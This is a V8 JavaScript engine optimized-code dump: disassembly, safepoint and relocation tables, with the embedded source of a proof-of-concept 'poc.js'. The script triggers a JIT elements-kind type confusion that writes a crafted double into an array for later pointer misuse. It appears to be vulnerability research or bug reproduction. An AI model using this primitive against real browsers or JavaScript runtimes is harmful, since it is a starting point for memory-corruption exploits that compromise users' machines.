0x26c10af0a06c   908  48b8efbeadbeedbeadde REX.W movq rax,0xdeadbeedbeadbeef
                  ;;; <@97,#79> gap
0x26c10af0a076   918  488b45e0       REX.W movq rax,[rbp-0x20]
                  ;;; <@98,#84> add-i
0x26c10af0a07a   922  8d5801         leal rbx,[rax+0x1]
                  ;;; <@101,#87> goto
0x26c10af0a07d   925  e99cfcffff     jmp 62  (0x26c10af09d1e)
                  ;;; <@102,#31> -------------------- B6 (unreachable/replaced) --------------------
                  ;;; <@106,#88> -------------------- B7 --------------------
                  ;;; <@108,#2> constant-t
0x26c10af0a082   930  48b81123b03897130000 REX.W movq rax,0x139738b02311    ;; object: 0x139738b02311 <undefined>
                  ;;; <@110,#90> return
0x26c10af0a08c   940  488be5         REX.W movq rsp,rbp
0x26c10af0a08f   943  5d             pop rbp
0x26c10af0a090   944  c20800         ret 0x8
                  ;;; <@44,#36> -------------------- Deferred stack-check --------------------
0x26c10af0a093   947  50             push rax
0x26c10af0a094   948  51             push rcx
0x26c10af0a095   949  52             push rdx
0x26c10af0a096   950  53             push rbx
0x26c10af0a097   951  56             push rsi
0x26c10af0a098   952  57             push rdi
0x26c10af0a099   953  4150           push r8
0x26c10af0a09b   955  4151           push r9
0x26c10af0a09d   957  4153           push r11
0x26c10af0a09f   959  4154           push r12
0x26c10af0a0a1   961  4156           push r14
0x26c10af0a0a3   963  4157           push r15
0x26c10af0a0a5   965  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0a0aa   970  488b75f8       REX.W movq rsi,[rbp-0x8]
0x26c10af0a0ae   974  33c0           xorl rax,rax
0x26c10af0a0b0   976  48bb309072cad27f0000 REX.W movq rbx,0x7fd2ca729030    ;; external reference (Runtime::StackGuard)
0x26c10af0a0ba   986  e881bfdfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0a0bf   991  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0a0c4   996  415f           pop r15
0x26c10af0a0c6   998  415e           pop r14
0x26c10af0a0c8  1000  415c           pop r12
0x26c10af0a0ca  1002  415b           pop r11
0x26c10af0a0cc  1004  4159           pop r9
0x26c10af0a0ce  1006  4158           pop r8
0x26c10af0a0d0  1008  5f             pop rdi
0x26c10af0a0d1  1009  5e             pop rsi
0x26c10af0a0d2  1010  5b             pop rbx
0x26c10af0a0d3  1011  5a             pop rdx
0x26c10af0a0d4  1012  59             pop rcx
0x26c10af0a0d5  1013  58             pop rax
0x26c10af0a0d6  1014  e9a1fcffff     jmp 156  (0x26c10af09d7c)
                  ;;; <@54,#49> -------------------- Deferred allocate --------------------
0x26c10af0a0db  1019  33c9           xorl rcx,rcx
0x26c10af0a0dd  1021  50             push rax
0x26c10af0a0de  1022  51             push rcx
0x26c10af0a0df  1023  52             push rdx
0x26c10af0a0e0  1024  53             push rbx
0x26c10af0a0e1  1025  56             push rsi
0x26c10af0a0e2  1026  57             push rdi
0x26c10af0a0e3  1027  4150           push r8
0x26c10af0a0e5  1029  4151           push r9
0x26c10af0a0e7  1031  4153           push r11
0x26c10af0a0e9  1033  4154           push r12
0x26c10af0a0eb  1035  4156           push r14
0x26c10af0a0ed  1037  4157           push r15
0x26c10af0a0ef  1039  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0a0f4  1044  6a00           push 0x0
0x26c10af0a0f6  1046  c644240438     movb [rsp+0x4],0x38
0x26c10af0a0fb  1051  6a00           push 0x0
0x26c10af0a0fd  1053  488b75e8       REX.W movq rsi,[rbp-0x18]
0x26c10af0a101  1057  b802000000     movl rax,0x2
0x26c10af0a106  1062  48bb809b72cad27f0000 REX.W movq rbx,0x7fd2ca729b80    ;; external reference (Runtime::AllocateInTargetSpace)
0x26c10af0a110  1072  e82bbfdfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0a115  1077  4889442470     REX.W movq [rsp+0x70],rax
0x26c10af0a11a  1082  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0a11f  1087  415f           pop r15
0x26c10af0a121  1089  415e           pop r14
0x26c10af0a123  1091  415c           pop r12
0x26c10af0a125  1093  415b           pop r11
0x26c10af0a127  1095  4159           pop r9
0x26c10af0a129  1097  4158           pop r8
0x26c10af0a12b  1099  5f             pop rdi
0x26c10af0a12c  1100  5e             pop rsi
0x26c10af0a12d  1101  5b             pop rbx
0x26c10af0a12e  1102  5a             pop rdx
0x26c10af0a12f  1103  59             pop rcx
0x26c10af0a130  1104  58             pop rax
0x26c10af0a131  1105  e99efcffff     jmp 244  (0x26c10af09dd4)
                  ;;; -------------------- Jump table --------------------
0x26c10af0a136  1110  e8cf9ec7ff     call 0x26c10ab8400a     ;; deoptimization bailout 1
0x26c10af0a13b  1115  e8de9ec7ff     call 0x26c10ab8401e     ;; deoptimization bailout 3
0x26c10af0a140  1120  e8e39ec7ff     call 0x26c10ab84028     ;; deoptimization bailout 4
0x26c10af0a145  1125  e8f29ec7ff     call 0x26c10ab8403c     ;; deoptimization bailout 6
0x26c10af0a14a  1130  e8f79ec7ff     call 0x26c10ab84046     ;; deoptimization bailout 7
0x26c10af0a14f  1135  e8fc9ec7ff     call 0x26c10ab84050     ;; deoptimization bailout 8
                  ;;; Safepoint table.

Source positions:
 pc offset  position
        60       334
        60       334
        60       334
        60       334
        62       334
        66       334
        66       334
        76       334
        76       334
        96       334
        96       334
       106       334
       106       334
       135       334
       135       334
       135       334
       143       334
       143       334
       143       334
       156       334
       156       334
       166       334
       166       334
       170       334
       170       334
       178       334
       178       334
       183       334
       187       334
       244       334
       248       334
       283       334
       283       334
       318       334
       318       334
       353       334
       353       334
       388       334
       388       334
       423       334
       423       334
       458       334
       458       334
       493       334
       493       334
       528       334
       528       334
       563       334
       563       334
       598       334
       598       334
       633       334
       633       334
       642       334
       649       334
       730       334
       730       334
       730       334
       734       334
       754       334
       754       334
       758       334
       758       334
       778       334
       778       334
       807       334
       807       334
       816       334
       828       334
       918       334
       922       351
       925       351
       925       351
       925       351
       930       351
       930       351
       940       351
       947       351
       947       334
      1019       334

Inlined functions (count = 0)

Deoptimization Input Data (deopt points = 9)
 index  ast id    argc     pc
     0       4       0     60
     1      11       0     -1
     2      15       0    156
     3      15       0     -1
     4      15       0     -1
     5      15       0    730
     6      15       0     -1
     7      15       0     -1
     8      15       0     -1

Safepoints (size = 52)
0x26c10af09d1c    60  00010000 (sp -> fp)       0
0x26c10af09fa3   707  11010000 | rax | rsi (sp -> fp)       5
0x26c10af0a0bf   991  00010000 (sp -> fp)       2
0x26c10af0a115  1077  01010000 | rcx | rdx (sp -> fp)  <none> argc: 2

RelocInfo (size = 1006)
0x26c10af09d03  comment  (;;; <@0,#0> -------------------- B0 --------------------)
0x26c10af09d03  comment  (;;; <@4,#3> prologue)
0x26c10af09d03  comment  (;;; Prologue begin)
0x26c10af09d03  comment  (;;; Prologue end)
0x26c10af09d03  comment  (;;; <@8,#5> -------------------- B1 --------------------)
0x26c10af09d03  comment  (;;; <@10,#6> context)
0x26c10af09d07  comment  (;;; <@11,#6> gap)
0x26c10af09d0b  comment  (;;; <@14,#10> -------------------- B2 --------------------)
0x26c10af09d0b  comment  (;;; <@15,#10> gap)
0x26c10af09d0e  comment  (;;; <@16,#12> stack-check)
0x26c10af09d18  code target (BUILTIN)  (0x26c10ade9300)
0x26c10af09d1c  comment  (;;; <@18,#12> lazy-bailout)
0x26c10af09d1c  comment  (;;; <@20,#71> check-maps)
0x26c10af09d1c  comment  (;;; <@22,#73> check-maps)
0x26c10af09d1c  comment  (;;; <@24,#20> gap)
0x26c10af09d1e  comment  (;;; <@26,#21> -------------------- B3 (loop header) --------------------)
0x26c10af09d22  comment  (;;; <@28,#24> constant-t)
0x26c10af09d24  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af09d2c  comment  (;;; <@30,#25> check-maps)
0x26c10af09d2e  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af09d40  comment  (;;; <@32,#24> constant-t)
0x26c10af09d42  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af09d4a  comment  (;;; <@34,#26> load-named-field)
0x26c10af09d54  comment  (Abort message: )
0x26c10af09d54  comment  (Operand is not a smi)
0x26c10af09d5f  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09d67  comment  (;;; <@37,#27> compare-numeric-and-branch)
0x26c10af09d6f  comment  (;;; <@38,#28> -------------------- B4 (unreachable/replaced) --------------------)
0x26c10af09d6f  comment  (;;; <@42,#34> -------------------- B5 --------------------)
0x26c10af09d6f  comment  (;;; <@44,#36> stack-check)
0x26c10af09d7c  comment  (;;; <@46,#24> constant-t)
0x26c10af09d7e  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af09d86  comment  (;;; <@48,#40> load-named-field)
0x26c10af09d8a  comment  (;;; <@50,#42> bounds-check)
0x26c10af09d92  comment  (;;; <@52,#43> load-keyed)
0x26c10af09d97  comment  (;;; <@53,#43> gap)
0x26c10af09d9b  comment  (;;; <@54,#49> allocate)
0x26c10af09dba  comment  (Abort message: )
0x26c10af09dba  comment  (Unaligned allocation in new space)
0x26c10af09dc5  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09dd4  comment  (;;; <@55,#49> gap)
0x26c10af09dd8  comment  (;;; <@56,#51> store-named-field)
0x26c10af09ddd  comment  (Abort message: )
0x26c10af09ddd  comment  (Operand is a smi)
0x26c10af09de8  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09def  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af09dfb  comment  (;;; <@58,#53> store-named-field)
0x26c10af09e00  comment  (Abort message: )
0x26c10af09e00  comment  (Operand is a smi)
0x26c10af09e0b  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09e12  embedded object  (0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09e1e  comment  (;;; <@60,#55> store-named-field)
0x26c10af09e23  comment  (Abort message: )
0x26c10af09e23  comment  (Operand is a smi)
0x26c10af09e2e  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09e35  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af09e41  comment  (;;; <@62,#56> store-named-field)
0x26c10af09e46  comment  (Abort message: )
0x26c10af09e46  comment  (Operand is a smi)
0x26c10af09e51  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09e58  embedded object  (0x139738b02311 <undefined>)
0x26c10af09e64  comment  (;;; <@64,#57> store-named-field)
0x26c10af09e69  comment  (Abort message: )
0x26c10af09e69  comment  (Operand is a smi)
0x26c10af09e74  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09e7b  embedded object  (0x139738b02311 <undefined>)
0x26c10af09e87  comment  (;;; <@66,#58> store-named-field)
0x26c10af09e8c  comment  (Abort message: )
0x26c10af09e8c  comment  (Operand is a smi)
0x26c10af09e97  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09e9e  embedded object  (0x139738b02311 <undefined>)
0x26c10af09eaa  comment  (;;; <@68,#59> store-named-field)
0x26c10af09eaf  comment  (Abort message: )
0x26c10af09eaf  comment  (Operand is a smi)
0x26c10af09eba  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09ec1  embedded object  (0x139738b02311 <undefined>)
0x26c10af09ecd  comment  (;;; <@70,#63> store-named-field)
0x26c10af09ed2  comment  (Abort message: )
0x26c10af09ed2  comment  (Operand is a smi)
0x26c10af09edd  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09ee4  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09ef0  comment  (;;; <@72,#64> store-named-field)
0x26c10af09ef5  comment  (Abort message: )
0x26c10af09ef5  comment  (Operand is a smi)
0x26c10af09f00  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09f07  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09f13  comment  (;;; <@74,#65> store-named-field)
0x26c10af09f18  comment  (Abort message: )
0x26c10af09f18  comment  (Operand is a smi)
0x26c10af09f23  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09f2a  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09f36  comment  (;;; <@76,#66> store-named-field)
0x26c10af09f3b  comment  (Abort message: )
0x26c10af09f3b  comment  (Operand is a smi)
0x26c10af09f46  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09f4d  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09f59  comment  (;;; <@78,#67> check-non-smi)
0x26c10af09f62  comment  (;;; <@79,#67> gap)
0x26c10af09f69  comment  (;;; <@80,#68> transition-elements-kind)
0x26c10af09f6b  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af09f96  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af09f9f  code target (STUB)  (0x26c10af08900)
0x26c10af09fba  comment  (;;; <@82,#68> lazy-bailout)
0x26c10af09fba  comment  (;;; <@83,#68> gap)
0x26c10af09fbe  comment  (;;; <@84,#69> check-maps)
0x26c10af09fc0  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af09fd2  comment  (;;; <@86,#74> load-named-field)
0x26c10af09fd6  comment  (;;; <@88,#75> check-maps)
0x26c10af09fd8  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09fea  comment  (;;; <@90,#76> load-named-field)
0x26c10af09ff4  comment  (Abort message: )
0x26c10af09ff4  comment  (Operand is not a smi)
0x26c10af09fff  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0a007  comment  (;;; <@92,#77> bounds-check)
0x26c10af0a010  comment  (;;; <@94,#48> constant-i)
0x26c10af0a012  comment  (;;; <@95,#48> gap)
0x26c10af0a01c  comment  (;;; <@96,#79> store-keyed)
0x26c10af0a02b  comment  (Abort message: )
0x26c10af0a02b  comment  (Operand is a smi)
0x26c10af0a036  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0a05e  code target (STUB)  (0x26c10af08da0)
0x26c10af0a076  comment  (;;; <@97,#79> gap)
0x26c10af0a07a  comment  (;;; <@98,#84> add-i)
0x26c10af0a07d  comment  (;;; <@101,#87> goto)
0x26c10af0a082  comment  (;;; <@102,#31> -------------------- B6 (unreachable/replaced) --------------------)
0x26c10af0a082  comment  (;;; <@106,#88> -------------------- B7 --------------------)
0x26c10af0a082  comment  (;;; <@108,#2> constant-t)
0x26c10af0a084  embedded object  (0x139738b02311 <undefined>)
0x26c10af0a08c  comment  (;;; <@110,#90> return)
0x26c10af0a093  comment  (;;; <@44,#36> -------------------- Deferred stack-check --------------------)
0x26c10af0a0b2  external reference (Runtime::StackGuard)  (0x7fd2ca729030)
0x26c10af0a0bb  code target (STUB)  (0x26c10ad06040)
0x26c10af0a0db  comment  (;;; <@54,#49> -------------------- Deferred allocate --------------------)
0x26c10af0a108  external reference (Runtime::AllocateInTargetSpace)  (0x7fd2ca729b80)
0x26c10af0a111  code target (STUB)  (0x26c10ad06040)
0x26c10af0a136  comment  (;;; -------------------- Jump table --------------------)
0x26c10af0a137  runtime entry  (deoptimization bailout 1)
0x26c10af0a13c  runtime entry  (deoptimization bailout 3)
0x26c10af0a141  runtime entry  (deoptimization bailout 4)
0x26c10af0a146  runtime entry  (deoptimization bailout 6)
0x26c10af0a14b  runtime entry  (deoptimization bailout 7)
0x26c10af0a150  runtime entry  (deoptimization bailout 8)
0x26c10af0a154  comment  (;;; Safepoint table.)

--- End code ---
--- Raw source ---
() {
    try {} catch(e) {}  // Prevent Crankshaft from inlining this.
    if (flag == 1) {
        array[1] = double_arr2;
    }
}


--- Optimized code ---
optimization_id = 2
source_position = 471
kind = OPTIMIZED_FUNCTION
name = swap
stack_slots = 4
compiler = turbofan
Instructions (size = 91)
                  -- B0 start (construct frame) --
0x26c10af0a3c0     0  55             push rbp
0x26c10af0a3c1     1  4889e5         REX.W movq rbp,rsp
0x26c10af0a3c4     4  56             push rsi
0x26c10af0a3c5     5  57             push rdi
0x26c10af0a3c6     6  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af0a3cd    13  0f860b000000   jna 30  (0x26c10af0a3de)
                  -- B2 start --
                  -- B3 start (deconstruct frame) --
0x26c10af0a3d3    19  498b45a0       REX.W movq rax,[r13-0x60]
0x26c10af0a3d7    23  488be5         REX.W movq rsp,rbp
0x26c10af0a3da    26  5d             pop rbp
0x26c10af0a3db    27  c20800         ret 0x8
                  -- B4 start (no frame) --
                  -- B1 start (deferred) --
                  -- <poc.js:22:14> --
0x26c10af0a3de    30  48897df0       REX.W movq [rbp-0x10],rdi
0x26c10af0a3e2    34  488975f8       REX.W movq [rbp-0x8],rsi
0x26c10af0a3e6    38  48bb309072cad27f0000 REX.W movq rbx,0x7fd2ca729030    ;; external reference (Runtime::StackGuard)
0x26c10af0a3f0    48  33c0           xorl rax,rax
0x26c10af0a3f2    50  e8a99ddfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
0x26c10af0a3f7    55  ebda           jmp 19  (0x26c10af0a3d3)
0x26c10af0a3f9    57  90             nop
0x26c10af0a3fa    58  90             nop
0x26c10af0a3fb    59  90             nop
0x26c10af0a3fc    60  90             nop
0x26c10af0a3fd    61  90             nop
0x26c10af0a3fe    62  90             nop
0x26c10af0a3ff    63  90             nop
0x26c10af0a400    64  90             nop
0x26c10af0a401    65  90             nop
0x26c10af0a402    66  90             nop
0x26c10af0a403    67  90             nop
0x26c10af0a404    68  90             nop
0x26c10af0a405    69  90             nop
0x26c10af0a406    70  6690           nop
                  ;;; Safepoint table.

Source positions:
 pc offset  position
        30       471

Inlined functions (count = 0)

Deoptimization Input Data (deopt points = 1)
 index  ast id    argc     pc
     0       0       0     55

Safepoints (size = 19)
0x26c10af0a3f7    55  0000 (sp -> fp)       0

RelocInfo (size = 73)
0x26c10af0a3c0  comment  (-- B0 start (construct frame) --)
0x26c10af0a3d3  comment  (-- B2 start --)
0x26c10af0a3d3  comment  (-- B3 start (deconstruct frame) --)
0x26c10af0a3de  comment  (-- B4 start (no frame) --)
0x26c10af0a3de  comment  (-- B1 start (deferred) --)
0x26c10af0a3de  comment  (-- <poc.js:22:14> --)
0x26c10af0a3e8  external reference (Runtime::StackGuard)  (0x7fd2ca729030)
0x26c10af0a3f3  code target (STUB)  (0x26c10ad041a0)
0x26c10af0a408  comment  (;;; Safepoint table.)

--- End code ---
--- Raw source ---
/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-02-23 17:35:00
 * Author: raycp
 * 
 * Last Modified: 2020-02-23 18:31:02
 * Description: 
************************************************************/
var array = [[{}], [1.1]];

function transition() {
    for(var i = 0; i < array.length; i++){
        var arr = array[i];
        arr[0] = {};
    }
}

var double_arr2 = [1.1,2.2];

var flag = 0;
function swap() {
    try {} catch(e) {}  // Prevent Crankshaft from inlining this.
    if (flag == 1) {
        array[1] = double_arr2;
    }
}

var expected = 6.176516726456e-312;
function f(){
    swap();
    double_arr2[0] = 1;
    transition();
    double_arr2[1] = expected;
}

// %OptimizeFunctionOnNextCall(f);
for(var i = 0; i < 0x10000; i++) {
    f();
}
flag = 1;
//%DebugPrint(double_arr2);
//%SystemBreak();
f();
//%DebugPrint(double_arr2);
//%SystemBreak();
//assertEquals(expected, double_arr2[1]);
print(double_arr2[1]);


--- Optimized code ---
optimization_id = 3
source_position = 0
kind = OPTIMIZED_FUNCTION
stack_slots = 13
compiler = crankshaft
Instructions (size = 4168)
0x26c10af0ab20     0  55             push rbp
0x26c10af0ab21     1  4889e5         REX.W movq rbp,rsp
0x26c10af0ab24     4  56             push rsi
0x26c10af0ab25     5  57             push rdi
0x26c10af0ab26     6  4883ec48       REX.W subq rsp,0x48
0x26c10af0ab2a    10  50             push rax
0x26c10af0ab2b    11  b809000000     movl rax,0x9
0x26c10af0ab30    16  49baefdeefbeaddeefbe REX.W movq r10,0xbeefdeadbeefdeef
0x26c10af0ab3a    26  4c8914c4       REX.W movq [rsp+rax*8],r10
0x26c10af0ab3e    30  ffc8           decl rax
0x26c10af0ab40    32  75f8           jnz 26  (0x26c10af0ab3a)
0x26c10af0ab42    34  58             pop rax
                  ;;; <@0,#0> -------------------- B0 --------------------
                  ;;; <@4,#3> prologue
                  ;;; Prologue begin
                  ;;; Prologue end
                  ;;; <@8,#5> -------------------- B1 --------------------
                  ;;; <@10,#6> context
0x26c10af0ab43    35  488b45f8       REX.W movq rax,[rbp-0x8]
                  ;;; <@11,#6> gap
0x26c10af0ab47    39  488945e0       REX.W movq [rbp-0x20],rax
                  ;;; <@14,#10> -------------------- B2 --------------------
                  ;;; <@15,#10> gap
0x26c10af0ab4b    43  488bf0         REX.W movq rsi,rax
                  ;;; <@16,#11> declare-globals
0x26c10af0ab4e    46  49bac9ea2371ce040000 REX.W movq r10,0x4ce7123eac9    ;; object: 0x4ce7123eac9 <FixedArray[32]>
0x26c10af0ab58    56  4152           push r10
0x26c10af0ab5a    58  6a00           push 0x0
0x26c10af0ab5c    60  49ba99212371ce040000 REX.W movq r10,0x4ce71232199    ;; object: 0x4ce71232199 <FixedArray[44]>
0x26c10af0ab66    70  4152           push r10
0x26c10af0ab68    72  b803000000     movl rax,0x3
0x26c10af0ab6d    77  48bb40de76cad27f0000 REX.W movq rbx,0x7fd2ca76de40    ;; external reference (Runtime::DeclareGlobals)
0x26c10af0ab77    87  e82496dfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
                  ;;; <@18,#12> lazy-bailout
                  ;;; <@19,#12> gap
0x26c10af0ab7c    92  488b75e0       REX.W movq rsi,[rbp-0x20]
                  ;;; <@20,#13> stack-check
0x26c10af0ab80    96  660f1f840000000000 nop
0x26c10af0ab89   105  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af0ab90   112  7305           jnc 119  (0x26c10af0ab97)
0x26c10af0ab92   114  e869e7edff     call StackCheck  (0x26c10ade9300)    ;; code: BUILTIN
                  ;;; <@22,#13> lazy-bailout
                  ;;; <@24,#18> allocate
0x26c10af0ab97   119  498b9d68fc0300 REX.W movq rbx,[r13+0x3fc68]
0x26c10af0ab9e   126  488bc3         REX.W movq rax,rbx
0x26c10af0aba1   129  4805e8000000   REX.W add rax,0xe8
0x26c10af0aba7   135  493b8570fc0300 REX.W cmpq rax,[r13+0x3fc70]
0x26c10af0abae   142  0f876a0d0000   ja 3582  (0x26c10af0b91e)
0x26c10af0abb4   148  48ffc3         REX.W incq rbx
                  ;;; <@26,#503> fast-allocate
0x26c10af0abb7   151  498b9d68fc0300 REX.W movq rbx,[r13+0x3fc68]
0x26c10af0abbe   158  488d4320       REX.W leaq rax,[rbx+0x20]
0x26c10af0abc2   162  a807           test al,0x7
0x26c10af0abc4   164  7410           jz 182  (0x26c10af0abd6)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0abc6   166  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0abd0   176  e84b95dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0abd5   181  cc             int3l
0x26c10af0abd6   182  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0abdd   189  4883c301       REX.W addq rbx,0x1
                  ;;; <@28,#20> store-named-field
0x26c10af0abe1   193  f6c301         testb rbx,0x1
0x26c10af0abe4   196  7510           jnz 214  (0x26c10af0abf6)
                  Abort message: 
                  Operand is a smi
0x26c10af0abe6   198  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0abf0   208  e82b95dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0abf5   213  cc             int3l
0x26c10af0abf6   214  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ac00   224  4c89530f       REX.W movq [rbx+0xf],r10
                  ;;; <@30,#22> store-named-field
0x26c10af0ac04   228  f6c301         testb rbx,0x1
0x26c10af0ac07   231  7510           jnz 249  (0x26c10af0ac19)
                  Abort message: 
                  Operand is a smi
0x26c10af0ac09   233  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ac13   243  e80895dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ac18   248  cc             int3l
0x26c10af0ac19   249  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0ac23   259  4c8953ff       REX.W movq [rbx-0x1],r10
                  ;;; <@32,#24> store-named-field
0x26c10af0ac27   263  f6c301         testb rbx,0x1
0x26c10af0ac2a   266  7510           jnz 284  (0x26c10af0ac3c)
                  Abort message: 
                  Operand is a smi
0x26c10af0ac2c   268  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ac36   278  e8e594dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ac3b   283  cc             int3l
0x26c10af0ac3c   284  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ac46   294  4c895307       REX.W movq [rbx+0x7],r10
                  ;;; <@34,#26> store-named-field
0x26c10af0ac4a   298  f6c301         testb rbx,0x1
0x26c10af0ac4d   301  7510           jnz 319  (0x26c10af0ac5f)
                  Abort message: 
                  Operand is a smi
0x26c10af0ac4f   303  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ac59   313  e8c294dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ac5e   318  cc             int3l
0x26c10af0ac5f   319  49ba0000000002000000 REX.W movq r10,0x200000000
0x26c10af0ac69   329  4c895317       REX.W movq [rbx+0x17],r10
                  ;;; <@36,#28> fast-allocate
0x26c10af0ac6d   333  498b9568fc0300 REX.W movq rdx,[r13+0x3fc68]
0x26c10af0ac74   340  488d4220       REX.W leaq rax,[rdx+0x20]
0x26c10af0ac78   344  a807           test al,0x7
0x26c10af0ac7a   346  7410           jz 364  (0x26c10af0ac8c)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0ac7c   348  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0ac86   358  e89594dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ac8b   363  cc             int3l
0x26c10af0ac8c   364  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0ac93   371  4883c201       REX.W addq rdx,0x1
                  ;;; <@38,#31> store-named-field
0x26c10af0ac97   375  f6c201         testb rdx,0x1
0x26c10af0ac9a   378  7510           jnz 396  (0x26c10af0acac)
                  Abort message: 
                  Operand is a smi
0x26c10af0ac9c   380  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0aca6   390  e87594dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0acab   395  cc             int3l
0x26c10af0acac   396  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0acb6   406  4c8952ff       REX.W movq [rdx-0x1],r10
                  ;;; <@40,#32> store-named-field
0x26c10af0acba   410  f6c201         testb rdx,0x1
0x26c10af0acbd   413  7510           jnz 431  (0x26c10af0accf)
                  Abort message: 
                  Operand is a smi
0x26c10af0acbf   415  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0acc9   425  e85294dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0acce   430  cc             int3l
0x26c10af0accf   431  49ba0000000002000000 REX.W movq r10,0x200000000
0x26c10af0acd9   441  4c895207       REX.W movq [rdx+0x7],r10
                  ;;; <@42,#36> fast-allocate
0x26c10af0acdd   445  498b8d68fc0300 REX.W movq rcx,[r13+0x3fc68]
0x26c10af0ace4   452  488d4120       REX.W leaq rax,[rcx+0x20]
0x26c10af0ace8   456  a807           test al,0x7
0x26c10af0acea   458  7410           jz 476  (0x26c10af0acfc)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0acec   460  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0acf6   470  e82594dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0acfb   475  cc             int3l
0x26c10af0acfc   476  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0ad03   483  4883c101       REX.W addq rcx,0x1
                  ;;; <@44,#38> store-named-field
0x26c10af0ad07   487  f6c101         testb rcx,0x1
0x26c10af0ad0a   490  7510           jnz 508  (0x26c10af0ad1c)
                  Abort message: 
                  Operand is a smi
0x26c10af0ad0c   492  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ad16   502  e80594dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ad1b   507  cc             int3l
0x26c10af0ad1c   508  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ad26   518  4c89510f       REX.W movq [rcx+0xf],r10
                  ;;; <@46,#40> store-named-field
0x26c10af0ad2a   522  f6c101         testb rcx,0x1
0x26c10af0ad2d   525  7510           jnz 543  (0x26c10af0ad3f)
                  Abort message: 
                  Operand is a smi
0x26c10af0ad2f   527  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ad39   537  e8e293dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ad3e   542  cc             int3l
